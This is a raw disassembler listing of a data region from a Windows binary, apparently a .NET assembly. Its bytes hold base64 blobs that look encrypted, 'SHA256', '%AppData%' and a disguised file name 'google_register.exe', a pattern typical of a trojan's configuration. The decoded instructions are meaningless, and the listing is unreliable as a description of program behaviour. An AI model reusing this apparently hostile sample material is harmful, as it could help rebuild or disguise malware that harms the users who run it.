  409ea8:	6d                   	insl   (%dx),%es:(%edi)
  409ea9:	6c                   	insb   (%dx),%es:(%edi)
  409eaa:	6f                   	outsl  %ds:(%esi),(%dx)
  409eab:	46                   	inc    %esi
  409eac:	6f                   	outsl  %ds:(%esi),(%dx)
  409ead:	4e                   	dec    %esi
  409eae:	6c                   	insb   (%dx),%es:(%edi)
  409eaf:	4f                   	dec    %edi
  409eb0:	4a                   	dec    %edx
  409eb1:	7a 00                	jp     0x409eb3
  409eb3:	75 6d                	jne    0x409f22
  409eb5:	76 6e                	jbe    0x409f25
  409eb7:	75 55                	jne    0x409f0e
  409eb9:	76 42                	jbe    0x409efd
  409ebb:	79 41                	jns    0x409efe
  409ebd:	55                   	push   %ebp
  409ebe:	7a 00                	jp     0x409ec0
  409ec0:	61                   	popa
  409ec1:	49                   	dec    %ecx
  409ec2:	73 7a                	jae    0x409f3e
  409ec4:	56                   	push   %esi
  409ec5:	78 4e                	js     0x409f15
  409ec7:	68 6d 75 4f 51       	push   $0x514f756d
  409ecc:	55                   	push   %ebp
  409ecd:	7a 00                	jp     0x409ecf
  409ecf:	51                   	push   %ecx
  409ed0:	53                   	push   %ebx
  409ed1:	58                   	pop    %eax
  409ed2:	6d                   	insl   (%dx),%es:(%edi)
  409ed3:	52                   	push   %edx
  409ed4:	73 62                	jae    0x409f38
  409ed6:	46                   	inc    %esi
  409ed7:	61                   	popa
  409ed8:	7a 00                	jp     0x409eda
  409eda:	62 53 4a             	bound  %edx,0x4a(%ebx)
  409edd:	4d                   	dec    %ebp
  409ede:	44                   	inc    %esp
  409edf:	63 6b 44             	arpl   %ebp,0x44(%ebx)
  409ee2:	5a                   	pop    %edx
  409ee3:	48                   	dec    %eax
  409ee4:	4d                   	dec    %ebp
  409ee5:	45                   	inc    %ebp
  409ee6:	48                   	dec    %eax
  409ee7:	6e                   	outsb  %ds:(%esi),(%dx)
  409ee8:	69 56 62 7a 00 6f 53 	imul   $0x536f007a,0x62(%esi),%edx
  409eef:	55                   	push   %ebp
  409ef0:	6f                   	outsl  %ds:(%esi),(%dx)
  409ef1:	5a                   	pop    %edx
  409ef2:	57                   	push   %edi
  409ef3:	4e                   	dec    %esi
  409ef4:	56                   	push   %esi
  409ef5:	52                   	push   %edx
  409ef6:	48                   	dec    %eax
  409ef7:	5a                   	pop    %edx
  409ef8:	6a 68                	push   $0x68
  409efa:	7a 00                	jp     0x409efc
  409efc:	67 77 48             	addr16 ja 0x409f47
  409eff:	6f                   	outsl  %ds:(%esi),(%dx)
  409f00:	4a                   	dec    %edx
  409f01:	50                   	push   %eax
  409f02:	68 65 70 68 7a       	push   $0x7a687065
  409f07:	00 6e 70             	add    %ch,0x70(%esi)
  409f0a:	76 7a                	jbe    0x409f86
  409f0c:	53                   	push   %ebx
  409f0d:	71 71                	jno    0x409f80
  409f0f:	6e                   	outsb  %ds:(%esi),(%dx)
  409f10:	66 78 54             	data16 js 0x409f67
  409f13:	77 6c                	ja     0x409f81
  409f15:	7a 00                	jp     0x409f17
  409f17:	46                   	inc    %esi
  409f18:	6e                   	outsb  %ds:(%esi),(%dx)
  409f19:	44                   	inc    %esp
  409f1a:	49                   	dec    %ecx
  409f1b:	5a                   	pop    %edx
  409f1c:	69 70 6f 48 6e 70 79 	imul   $0x79706e48,0x6f(%eax),%esi
  409f23:	7a 00                	jp     0x409f25
  409f25:	00 00                	add    %al,(%eax)
  409f27:	00 00                	add    %al,(%eax)
  409f29:	0d 53 00 48 00       	or     $0x480053,%eax
  409f2e:	41                   	inc    %ecx
  409f2f:	00 32                	add    %dh,(%edx)
  409f31:	00 35 00 36 00 00    	add    %dh,0x3600
  409f37:	81 59 35 00 5a 00 52 	sbbl   $0x52005a00,0x35(%ecx)
  409f3e:	00 48 00             	add    %cl,0x0(%eax)
  409f41:	44                   	inc    %esp
  409f42:	00 4a 00             	add    %cl,0x0(%edx)
  409f45:	2f                   	das
  409f46:	00 34 00             	add    %dh,(%eax,%eax,1)
  409f49:	52                   	push   %edx
  409f4a:	00 69 00             	add    %ch,0x0(%ecx)
  409f4d:	6e                   	outsb  %ds:(%esi),(%dx)
  409f4e:	00 46 00             	add    %al,0x0(%esi)
  409f51:	7a 00                	jp     0x409f53
  409f53:	71 00                	jno    0x409f55
  409f55:	53                   	push   %ebx
  409f56:	00 76 00             	add    %dh,0x0(%esi)
  409f59:	77 00                	ja     0x409f5b
  409f5b:	4f                   	dec    %edi
  409f5c:	00 4d 00             	add    %cl,0x0(%ebp)
  409f5f:	6d                   	insl   (%dx),%es:(%edi)
  409f60:	00 79 00             	add    %bh,0x0(%ecx)
  409f63:	59                   	pop    %ecx
  409f64:	00 44 00 44          	add    %al,0x44(%eax,%eax,1)
  409f68:	00 47 00             	add    %al,0x0(%edi)
  409f6b:	31 00                	xor    %eax,(%eax)
  409f6d:	77 00                	ja     0x409f6f
  409f6f:	6e                   	outsb  %ds:(%esi),(%dx)
  409f70:	00 56 00             	add    %dl,0x0(%esi)
  409f73:	57                   	push   %edi
  409f74:	00 30                	add    %dh,(%eax)
  409f76:	00 43 00             	add    %al,0x0(%ebx)
  409f79:	61                   	popa
  409f7a:	00 56 00             	add    %dl,0x0(%esi)
  409f7d:	79 00                	jns    0x409f7f
  409f7f:	59                   	pop    %ecx
  409f80:	00 65 00             	add    %ah,0x0(%ebp)
  409f83:	2b 00                	sub    (%eax),%eax
  409f85:	6a 00                	push   $0x0
  409f87:	48                   	dec    %eax
  409f88:	00 66 00             	add    %ah,0x0(%esi)
  409f8b:	6d                   	insl   (%dx),%es:(%edi)
  409f8c:	00 78 00             	add    %bh,0x0(%eax)
  409f8f:	68 00 78 00 72       	push   $0x72007800
  409f94:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
  409f98:	00 53 00             	add    %dl,0x0(%ebx)
  409f9b:	53                   	push   %ebx
  409f9c:	00 34 00             	add    %dh,(%eax,%eax,1)
  409f9f:	36 00 43 00          	add    %al,%ss:0x0(%ebx)
  409fa3:	4d                   	dec    %ebp
  409fa4:	00 66 00             	add    %ah,0x0(%esi)
  409fa7:	6d                   	insl   (%dx),%es:(%edi)
  409fa8:	00 33                	add    %dh,(%ebx)
  409faa:	00 51 00             	add    %dl,0x0(%ecx)
  409fad:	2b 00                	sub    (%eax),%eax
  409faf:	42                   	inc    %edx
  409fb0:	00 69 00             	add    %ch,0x0(%ecx)
  409fb3:	66 00 2f             	data16 add %ch,(%edi)
  409fb6:	00 4f 00             	add    %cl,0x0(%edi)
  409fb9:	30 00                	xor    %al,(%eax)
  409fbb:	4d                   	dec    %ebp
  409fbc:	00 36                	add    %dh,(%esi)
  409fbe:	00 71 00             	add    %dh,0x0(%ecx)
  409fc1:	4e                   	dec    %esi
  409fc2:	00 38                	add    %bh,(%eax)
  409fc4:	00 45 00             	add    %al,0x0(%ebp)
  409fc7:	31 00                	xor    %eax,(%eax)
  409fc9:	4d                   	dec    %ebp
  409fca:	00 41 00             	add    %al,0x0(%ecx)
  409fcd:	4b                   	dec    %ebx
  409fce:	00 4b 00             	add    %cl,0x0(%ebx)
  409fd1:	58                   	pop    %eax
  409fd2:	00 6d 00             	add    %ch,0x0(%ebp)
  409fd5:	6b 00 53             	imul   $0x53,(%eax),%eax
  409fd8:	00 72 00             	add    %dh,0x0(%edx)
  409fdb:	49                   	dec    %ecx
  409fdc:	00 39                	add    %bh,(%ecx)
  409fde:	00 71 00             	add    %dh,0x0(%ecx)
  409fe1:	68 00 30 00 70       	push   $0x70003000
  409fe6:	00 35 00 4a 00 68    	add    %dh,0x68004a00
  409fec:	00 73 00             	add    %dh,0x0(%ebx)
  409fef:	74 00                	je     0x409ff1
  409ff1:	46                   	inc    %esi
  409ff2:	00 30                	add    %dh,(%eax)
  409ff4:	00 51 00             	add    %dl,0x0(%ecx)
  409ff7:	79 00                	jns    0x409ff9
  409ff9:	59                   	pop    %ecx
  409ffa:	00 6b 00             	add    %ch,0x0(%ebx)
  409ffd:	6e                   	outsb  %ds:(%esi),(%dx)
  409ffe:	00 71 00             	add    %dh,0x0(%ecx)
  40a001:	53                   	push   %ebx
  40a002:	00 42 00             	add    %al,0x0(%edx)
  40a005:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  40a008:	00 39                	add    %bh,(%ecx)
  40a00a:	00 31                	add    %dh,(%ecx)
  40a00c:	00 43 00             	add    %al,0x0(%ebx)
  40a00f:	68 00 68 00 6f       	push   $0x6f006800
  40a014:	00 6a 00             	add    %ch,0x0(%edx)
  40a017:	37                   	aaa
  40a018:	00 4f 00             	add    %cl,0x0(%edi)
  40a01b:	71 00                	jno    0x40a01d
  40a01d:	73 00                	jae    0x40a01f
  40a01f:	51                   	push   %ecx
  40a020:	00 59 00             	add    %bl,0x0(%ecx)
  40a023:	75 00                	jne    0x40a025
  40a025:	4f                   	dec    %edi
  40a026:	00 65 00             	add    %ah,0x0(%ebp)
  40a029:	61                   	popa
  40a02a:	00 75 00             	add    %dh,0x0(%ebp)
  40a02d:	78 00                	js     0x40a02f
  40a02f:	38 00                	cmp    %al,(%eax)
  40a031:	36 00 6e 00          	add    %ch,%ss:0x0(%esi)
  40a035:	70 00                	jo     0x40a037
  40a037:	6d                   	insl   (%dx),%es:(%edi)
  40a038:	00 30                	add    %dh,(%eax)
  40a03a:	00 6b 00             	add    %ch,0x0(%ebx)
  40a03d:	63 00                	arpl   %eax,(%eax)
  40a03f:	48                   	dec    %eax
  40a040:	00 37                	add    %dh,(%edi)
  40a042:	00 36                	add    %dh,(%esi)
  40a044:	00 56 00             	add    %dl,0x0(%esi)
  40a047:	56                   	push   %esi
  40a048:	00 43 00             	add    %al,0x0(%ebx)
  40a04b:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40a04f:	48                   	dec    %eax
  40a050:	00 4b 00             	add    %cl,0x0(%ebx)
  40a053:	65 00 75 00          	add    %dh,%gs:0x0(%ebp)
  40a057:	55                   	push   %ebp
  40a058:	00 4a 00             	add    %cl,0x0(%edx)
  40a05b:	31 00                	xor    %eax,(%eax)
  40a05d:	43                   	inc    %ebx
  40a05e:	00 33                	add    %dh,(%ebx)
  40a060:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a063:	31 00                	xor    %eax,(%eax)
  40a065:	65 00 2f             	add    %ch,%gs:(%edi)
  40a068:	00 36                	add    %dh,(%esi)
  40a06a:	00 50 00             	add    %dl,0x0(%eax)
  40a06d:	45                   	inc    %ebp
  40a06e:	00 30                	add    %dh,(%eax)
  40a070:	00 73 00             	add    %dh,0x0(%ebx)
  40a073:	72 00                	jb     0x40a075
  40a075:	66 00 36             	data16 add %dh,(%esi)
  40a078:	00 4a 00             	add    %cl,0x0(%edx)
  40a07b:	79 00                	jns    0x40a07d
  40a07d:	59                   	pop    %ecx
  40a07e:	00 61 00             	add    %ah,0x0(%ecx)
  40a081:	50                   	push   %eax
  40a082:	00 58 00             	add    %bl,0x0(%eax)
  40a085:	59                   	pop    %ecx
  40a086:	00 39                	add    %bh,(%ecx)
  40a088:	00 2b                	add    %ch,(%ebx)
  40a08a:	00 42 00             	add    %al,0x0(%edx)
  40a08d:	49                   	dec    %ecx
  40a08e:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  40a094:	50                   	push   %eax
  40a095:	00 78 00             	add    %bh,0x0(%eax)
  40a098:	4b                   	dec    %ebx
  40a099:	00 58 00             	add    %bl,0x0(%eax)
  40a09c:	43                   	inc    %ebx
  40a09d:	00 68 00             	add    %ch,0x0(%eax)
  40a0a0:	6a 00                	push   $0x0
  40a0a2:	34 00                	xor    $0x0,%al
  40a0a4:	4c                   	dec    %esp
  40a0a5:	00 76 00             	add    %dh,0x0(%esi)
  40a0a8:	55                   	push   %ebp
  40a0a9:	00 50 00             	add    %dl,0x0(%eax)
  40a0ac:	73 00                	jae    0x40a0ae
  40a0ae:	59                   	pop    %ecx
  40a0af:	00 4d 00             	add    %cl,0x0(%ebp)
  40a0b2:	39 00                	cmp    %eax,(%eax)
  40a0b4:	69 00 34 00 2b 00    	imul   $0x2b0034,(%eax),%eax
  40a0ba:	45                   	inc    %ebp
  40a0bb:	00 78 00             	add    %bh,0x0(%eax)
  40a0be:	31 00                	xor    %eax,(%eax)
  40a0c0:	78 00                	js     0x40a0c2
  40a0c2:	36 00 62 00          	add    %ah,%ss:0x0(%edx)
  40a0c6:	46                   	inc    %esi
  40a0c7:	00 68 00             	add    %ch,0x0(%eax)
  40a0ca:	73 00                	jae    0x40a0cc
  40a0cc:	45                   	inc    %ebp
  40a0cd:	00 46 00             	add    %al,0x0(%esi)
  40a0d0:	6a 00                	push   $0x0
  40a0d2:	45                   	inc    %ebp
  40a0d3:	00 77 00             	add    %dh,0x0(%edi)
  40a0d6:	4c                   	dec    %esp
  40a0d7:	00 4d 00             	add    %cl,0x0(%ebp)
  40a0da:	44                   	inc    %esp
  40a0db:	00 65 00             	add    %ah,0x0(%ebp)
  40a0de:	4f                   	dec    %edi
  40a0df:	00 5a 00             	add    %bl,0x0(%edx)
  40a0e2:	39 00                	cmp    %eax,(%eax)
  40a0e4:	37                   	aaa
  40a0e5:	00 7a 00             	add    %bh,0x0(%edx)
  40a0e8:	47                   	inc    %edi
  40a0e9:	00 49 00             	add    %cl,0x0(%ecx)
  40a0ec:	4a                   	dec    %edx
  40a0ed:	00 79 00             	add    %bh,0x0(%ecx)
  40a0f0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0f1:	00 65 00             	add    %ah,0x0(%ebp)
  40a0f4:	30 00                	xor    %al,(%eax)
  40a0f6:	57                   	push   %edi
  40a0f7:	00 72 00             	add    %dh,0x0(%edx)
  40a0fa:	41                   	inc    %ecx
  40a0fb:	00 51 00             	add    %dl,0x0(%ecx)
  40a0fe:	54                   	push   %esp
  40a0ff:	00 43 00             	add    %al,0x0(%ebx)
  40a102:	47                   	inc    %edi
  40a103:	00 4e 00             	add    %cl,0x0(%esi)
  40a106:	61                   	popa
  40a107:	00 79 00             	add    %bh,0x0(%ecx)
  40a10a:	41                   	inc    %ecx
  40a10b:	00 77 00             	add    %dh,0x0(%edi)
  40a10e:	71 00                	jno    0x40a110
  40a110:	37                   	aaa
  40a111:	00 6a 00             	add    %ch,0x0(%edx)
  40a114:	37                   	aaa
  40a115:	00 47 00             	add    %al,0x0(%edi)
  40a118:	6f                   	outsl  %ds:(%esi),(%dx)
  40a119:	00 32                	add    %dh,(%edx)
  40a11b:	00 4a 00             	add    %cl,0x0(%edx)
  40a11e:	4c                   	dec    %esp
  40a11f:	00 67 00             	add    %ah,0x0(%edi)
  40a122:	79 00                	jns    0x40a124
  40a124:	38 00                	cmp    %al,(%eax)
  40a126:	7a 00                	jp     0x40a128
  40a128:	6b 00 32             	imul   $0x32,(%eax),%eax
  40a12b:	00 77 00             	add    %dh,0x0(%edi)
  40a12e:	51                   	push   %ecx
  40a12f:	00 76 00             	add    %dh,0x0(%esi)
  40a132:	4d                   	dec    %ebp
  40a133:	00 39                	add    %bh,(%ecx)
  40a135:	00 37                	add    %dh,(%edi)
  40a137:	00 61 00             	add    %ah,0x0(%ecx)
  40a13a:	6a 00                	push   $0x0
  40a13c:	45                   	inc    %ebp
  40a13d:	00 67 00             	add    %ah,0x0(%edi)
  40a140:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40a145:	80 b1 65 00 35 00 42 	xorb   $0x42,0x350065(%ecx)
  40a14c:	00 36                	add    %dh,(%esi)
  40a14e:	00 66 00             	add    %ah,0x0(%esi)
  40a151:	70 00                	jo     0x40a153
  40a153:	50                   	push   %eax
  40a154:	00 74 00 36          	add    %dh,0x36(%eax,%eax,1)
  40a158:	00 77 00             	add    %dh,0x0(%edi)
  40a15b:	4c                   	dec    %esp
  40a15c:	00 69 00             	add    %ch,0x0(%ecx)
  40a15f:	43                   	inc    %ebx
  40a160:	00 75 00             	add    %dh,0x0(%ebp)
  40a163:	69 00 64 00 2b 00    	imul   $0x2b0064,(%eax),%eax
  40a169:	30 00                	xor    %al,(%eax)
  40a16b:	38 00                	cmp    %al,(%eax)
  40a16d:	78 00                	js     0x40a16f
  40a16f:	4c                   	dec    %esp
  40a170:	00 2f                	add    %ch,(%edi)
  40a172:	00 4c 00 58          	add    %cl,0x58(%eax,%eax,1)
  40a176:	00 4c 00 52          	add    %cl,0x52(%eax,%eax,1)
  40a17a:	00 4a 00             	add    %cl,0x0(%edx)
  40a17d:	79 00                	jns    0x40a17f
  40a17f:	4e                   	dec    %esi
  40a180:	00 38                	add    %bh,(%eax)
  40a182:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a185:	4f                   	dec    %edi
  40a186:	00 67 00             	add    %ah,0x0(%edi)
  40a189:	30 00                	xor    %al,(%eax)
  40a18b:	61                   	popa
  40a18c:	00 2f                	add    %ch,(%edi)
  40a18e:	00 2f                	add    %ch,(%edi)
  40a190:	00 6e 00             	add    %ch,0x0(%esi)
  40a193:	68 00 76 00 44       	push   $0x44007600
  40a198:	00 6e 00             	add    %ch,0x0(%esi)
  40a19b:	70 00                	jo     0x40a19d
  40a19d:	31 00                	xor    %eax,(%eax)
  40a19f:	7a 00                	jp     0x40a1a1
  40a1a1:	33 00                	xor    (%eax),%eax
  40a1a3:	4c                   	dec    %esp
  40a1a4:	00 4c 00 47          	add    %cl,0x47(%eax,%eax,1)
  40a1a8:	00 32                	add    %dh,(%edx)
  40a1aa:	00 46 00             	add    %al,0x0(%esi)
  40a1ad:	79 00                	jns    0x40a1af
  40a1af:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1b0:	00 58 00             	add    %bl,0x0(%eax)
  40a1b3:	6b 00 71             	imul   $0x71,(%eax),%eax
  40a1b6:	00 32                	add    %dh,(%edx)
  40a1b8:	00 2b                	add    %ch,(%ebx)
  40a1ba:	00 43 00             	add    %al,0x0(%ebx)
  40a1bd:	34 00                	xor    $0x0,%al
  40a1bf:	35 00 56 00 66       	xor    $0x66005600,%eax
  40a1c4:	00 30                	add    %dh,(%eax)
  40a1c6:	00 7a 00             	add    %bh,0x0(%edx)
  40a1c9:	6d                   	insl   (%dx),%es:(%edi)
  40a1ca:	00 4a 00             	add    %cl,0x0(%edx)
  40a1cd:	6b 00 44             	imul   $0x44,(%eax),%eax
  40a1d0:	00 62 00             	add    %ah,0x0(%edx)
  40a1d3:	75 00                	jne    0x40a1d5
  40a1d5:	6b 00 51             	imul   $0x51,(%eax),%eax
  40a1d8:	00 5a 00             	add    %bl,0x0(%edx)
  40a1db:	47                   	inc    %edi
  40a1dc:	00 57 00             	add    %dl,0x0(%edi)
  40a1df:	62 00                	bound  %eax,(%eax)
  40a1e1:	55                   	push   %ebp
  40a1e2:	00 57 00             	add    %dl,0x0(%edi)
  40a1e5:	76 00                	jbe    0x40a1e7
  40a1e7:	50                   	push   %eax
  40a1e8:	00 6c 00 7a          	add    %ch,0x7a(%eax,%eax,1)
  40a1ec:	00 37                	add    %dh,(%edi)
  40a1ee:	00 62 00             	add    %ah,0x0(%edx)
  40a1f1:	77 00                	ja     0x40a1f3
  40a1f3:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40a1f8:	80 b1 64 00 65 00 72 	xorb   $0x72,0x650064(%ecx)
  40a1ff:	00 2b                	add    %ch,(%ebx)
  40a201:	00 6d 00             	add    %ch,0x0(%ebp)
  40a204:	63 00                	arpl   %eax,(%eax)
  40a206:	35 00 58 00 49       	xor    $0x49005800,%eax
  40a20b:	00 6f 00             	add    %ch,0x0(%edi)
  40a20e:	41                   	inc    %ecx
  40a20f:	00 69 00             	add    %ch,0x0(%ecx)
  40a212:	53                   	push   %ebx
  40a213:	00 61 00             	add    %ah,0x0(%ecx)
  40a216:	73 00                	jae    0x40a218
  40a218:	54                   	push   %esp
  40a219:	00 33                	add    %dh,(%ebx)
  40a21b:	00 56 00             	add    %dl,0x0(%esi)
  40a21e:	68 00 31 00 79       	push   $0x79003100
  40a223:	00 5a 00             	add    %bl,0x0(%edx)
  40a226:	53                   	push   %ebx
  40a227:	00 51 00             	add    %dl,0x0(%ecx)
  40a22a:	46                   	inc    %esi
  40a22b:	00 4a 00             	add    %cl,0x0(%edx)
  40a22e:	77 00                	ja     0x40a230
  40a230:	43                   	inc    %ebx
  40a231:	00 69 00             	add    %ch,0x0(%ecx)
  40a234:	4c                   	dec    %esp
  40a235:	00 59 00             	add    %bl,0x0(%ecx)
  40a238:	4e                   	dec    %esi
  40a239:	00 66 00             	add    %ah,0x0(%esi)
  40a23c:	2b 00                	sub    (%eax),%eax
  40a23e:	69 00 32 00 4b 00    	imul   $0x4b0032,(%eax),%eax
  40a244:	43                   	inc    %ebx
  40a245:	00 47 00             	add    %al,0x0(%edi)
  40a248:	68 00 67 00 59       	push   $0x59006700
  40a24d:	00 42 00             	add    %al,0x0(%edx)
  40a250:	6b 00 59             	imul   $0x59,(%eax),%eax
  40a253:	00 36                	add    %dh,(%esi)
  40a255:	00 77 00             	add    %dh,0x0(%edi)
  40a258:	32 00                	xor    (%eax),%al
  40a25a:	32 00                	xor    (%eax),%al
  40a25c:	71 00                	jno    0x40a25e
  40a25e:	39 00                	cmp    %eax,(%eax)
  40a260:	6a 00                	push   $0x0
  40a262:	58                   	pop    %eax
  40a263:	00 4d 00             	add    %cl,0x0(%ebp)
  40a266:	77 00                	ja     0x40a268
  40a268:	35 00 69 00 66       	xor    $0x66006900,%eax
  40a26d:	00 4c 00 50          	add    %cl,0x50(%eax,%eax,1)
  40a271:	00 38                	add    %bh,(%eax)
  40a273:	00 58 00             	add    %bl,0x0(%eax)
  40a276:	61                   	popa
  40a277:	00 53 00             	add    %dl,0x0(%ebx)
  40a27a:	52                   	push   %edx
  40a27b:	00 2f                	add    %ch,(%edi)
  40a27d:	00 68 00             	add    %ch,0x0(%eax)
  40a280:	66 00 62 00          	data16 add %ah,0x0(%edx)
  40a284:	73 00                	jae    0x40a286
  40a286:	4d                   	dec    %ebp
  40a287:	00 30                	add    %dh,(%eax)
  40a289:	00 73 00             	add    %dh,0x0(%ebx)
  40a28c:	2b 00                	sub    (%eax),%eax
  40a28e:	6c                   	insb   (%dx),%es:(%edi)
  40a28f:	00 41 00             	add    %al,0x0(%ecx)
  40a292:	4e                   	dec    %esi
  40a293:	00 59 00             	add    %bl,0x0(%ecx)
  40a296:	4f                   	dec    %edi
  40a297:	00 41 00             	add    %al,0x0(%ecx)
  40a29a:	69 00 50 00 69 00    	imul   $0x690050,(%eax),%eax
  40a2a0:	6d                   	insl   (%dx),%es:(%edi)
  40a2a1:	00 57 00             	add    %dl,0x0(%edi)
  40a2a4:	67 00 3d             	add    %bh,(%di)
  40a2a7:	00 3d 00 00 13 25    	add    %bh,0x25130000
  40a2ad:	00 41 00             	add    %al,0x0(%ecx)
  40a2b0:	70 00                	jo     0x40a2b2
  40a2b2:	70 00                	jo     0x40a2b4
  40a2b4:	44                   	inc    %esp
  40a2b5:	00 61 00             	add    %ah,0x0(%ecx)
  40a2b8:	74 00                	je     0x40a2ba
  40a2ba:	61                   	popa
  40a2bb:	00 25 00 00 27 67    	add    %ah,0x67270000
  40a2c1:	00 6f 00             	add    %ch,0x0(%edi)
  40a2c4:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2c5:	00 67 00             	add    %ah,0x0(%edi)
  40a2c8:	6c                   	insb   (%dx),%es:(%edi)
  40a2c9:	00 65 00             	add    %ah,0x0(%ebp)
  40a2cc:	5f                   	pop    %edi
  40a2cd:	00 72 00             	add    %dh,0x0(%edx)
  40a2d0:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40a2d4:	69 00 73 00 74 00    	imul   $0x740073,(%eax),%eax
  40a2da:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a2de:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40a2e2:	78 00                	js     0x40a2e4
  40a2e4:	65 00 00             	add    %al,%gs:(%eax)
  40a2e7:	59                   	pop    %ecx
  40a2e8:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
  40a2ec:	46                   	inc    %esi
  40a2ed:	00 76 00             	add    %dh,0x0(%esi)
  40a2f0:	59                   	pop    %ecx
  40a2f1:	00 33                	add    %dh,(%ebx)
  40a2f3:	00 49 00             	add    %cl,0x0(%ecx)
  40a2f6:	78 00                	js     0x40a2f8
  40a2f8:	4d                   	dec    %ebp
  40a2f9:	00 46 00             	add    %al,0x0(%esi)
  40a2fc:	70 00                	jo     0x40a2fe
  40a2fe:	4c                   	dec    %esp
  40a2ff:	00 53 00             	add    %dl,0x0(%ebx)
  40a302:	47                   	inc    %edi
  40a303:	00 74 00 4c          	add    %dh,0x4c(%eax,%eax,1)
  40a307:	00 61 00             	add    %ah,0x0(%ecx)
  40a30a:	55                   	push   %ebp
  40a30b:	00 6c 00 4d          	add    %ch,0x4d(%eax,%eax,1)
  40a30f:	00 55 00             	add    %dl,0x0(%ebp)
  40a312:	6a 00                	push   $0x0
  40a314:	51                   	push   %ecx
  40a315:	00 7a 00             	add    %bh,0x0(%edx)
  40a318:	56                   	push   %esi
  40a319:	00 45 00             	add    %al,0x0(%ebp)
  40a31c:	4e                   	dec    %esi
  40a31d:	00 68 00             	add    %ch,0x0(%eax)
  40a320:	4e                   	dec    %esi
  40a321:	00 55 00             	add    %dl,0x0(%ebp)
  40a324:	56                   	push   %esi
  40a325:	00 6a 00             	add    %ch,0x0(%edx)
  40a328:	64 00 33             	add    %dh,%fs:(%ebx)
  40a32b:	00 46 00             	add    %al,0x0(%esi)
  40a32e:	68 00 53 00 46       	push   $0x46005300
  40a333:	00 52 00             	add    %dl,0x0(%edx)
  40a336:	4d                   	dec    %ebp
  40a337:	00 53 00             	add    %dl,0x0(%ebx)
  40a33a:	31 00                	xor    %eax,(%eax)
  40a33c:	41                   	inc    %ecx
  40a33d:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  40a343:	56                   	push   %esi
  40a344:	00 4f 00             	add    %cl,0x0(%edi)
  40a347:	57                   	push   %edi
  40a348:	00 2b                	add    %ch,(%ebx)
  40a34a:	00 75 00             	add    %dh,0x0(%ebp)
  40a34d:	55                   	push   %ebp
  40a34e:	00 47 00             	add    %al,0x0(%edi)
  40a351:	52                   	push   %edx
  40a352:	00 77 00             	add    %dh,0x0(%edi)
  40a355:	48                   	dec    %eax
  40a356:	00 48 00             	add    %cl,0x0(%eax)
  40a359:	62 00                	bound  %eax,(%eax)
  40a35b:	4d                   	dec    %ebp
  40a35c:	00 30                	add    %dh,(%eax)
  40a35e:	00 2f                	add    %ch,(%edi)
  40a360:	00 56 00             	add    %dl,0x0(%esi)
  40a363:	49                   	dec    %ecx
  40a364:	00 61 00             	add    %ah,0x0(%ecx)
  40a367:	52                   	push   %edx
  40a368:	00 50 00             	add    %dl,0x0(%eax)
  40a36b:	35 00 4a 00 72       	xor    $0x72004a00,%eax
  40a370:	00 73 00             	add    %dh,0x0(%ebx)
  40a373:	56                   	push   %esi
  40a374:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  40a378:	00 33                	add    %dh,(%ebx)
  40a37a:	00 47 00             	add    %al,0x0(%edi)
  40a37d:	70 00                	jo     0x40a37f
  40a37f:	55                   	push   %ebp
  40a380:	00 4f 00             	add    %cl,0x0(%edi)
  40a383:	35 00 57 00 30       	xor    $0x30005700,%eax
  40a388:	00 2f                	add    %ch,(%edi)
  40a38a:	00 61 00             	add    %ah,0x0(%ecx)
  40a38d:	43                   	inc    %ebx
  40a38e:	00 79 00             	add    %bh,0x0(%ecx)
  40a391:	51                   	push   %ecx
  40a392:	00 45 00             	add    %al,0x0(%ebp)
  40a395:	53                   	push   %ebx
  40a396:	00 41 00             	add    %al,0x0(%ecx)
  40a399:	6d                   	insl   (%dx),%es:(%edi)
  40a39a:	00 62 00             	add    %ah,0x0(%edx)
  40a39d:	69 00 54 00 57 00    	imul   $0x570054,(%eax),%eax
  40a3a3:	4a                   	dec    %edx
  40a3a4:	00 68 00             	add    %ch,0x0(%eax)
  40a3a7:	69 00 47 00 53 00    	imul   $0x530047,(%eax),%eax
  40a3ad:	46                   	inc    %esi
  40a3ae:	00 72 00             	add    %dh,0x0(%edx)
  40a3b1:	6d                   	insl   (%dx),%es:(%edi)
  40a3b2:	00 46 00             	add    %al,0x0(%esi)
  40a3b5:	59                   	pop    %ecx
  40a3b6:	00 51 00             	add    %dl,0x0(%ecx)
  40a3b9:	4d                   	dec    %ebp
  40a3ba:	00 30                	add    %dh,(%eax)
  40a3bc:	00 31                	add    %dh,(%ecx)
  40a3be:	00 52 00             	add    %dl,0x0(%edx)
  40a3c1:	55                   	push   %ebp
  40a3c2:	00 75 00             	add    %dh,0x0(%ebp)
  40a3c5:	55                   	push   %ebp
  40a3c6:	00 4b 00             	add    %cl,0x0(%ebx)
  40a3c9:	72 00                	jb     0x40a3cb
  40a3cb:	46                   	inc    %esi
  40a3cc:	00 38                	add    %bh,(%eax)
  40a3ce:	00 4e 00             	add    %cl,0x0(%esi)
  40a3d1:	51                   	push   %ecx
  40a3d2:	00 6d 00             	add    %ch,0x0(%ebp)
  40a3d5:	4d                   	dec    %ebp
  40a3d6:	00 4d 00             	add    %cl,0x0(%ebp)
  40a3d9:	31 00                	xor    %eax,(%eax)
  40a3db:	44                   	inc    %esp
  40a3dc:	00 33                	add    %dh,(%ebx)
  40a3de:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a3e1:	68 00 55 00 50       	push   $0x50005500
  40a3e6:	00 52 00             	add    %dl,0x0(%edx)
  40a3e9:	44                   	inc    %esp
  40a3ea:	00 39                	add    %bh,(%ecx)
  40a3ec:	00 77 00             	add    %dh,0x0(%edi)
  40a3ef:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40a3f4:	92                   	xchg   %eax,%edx
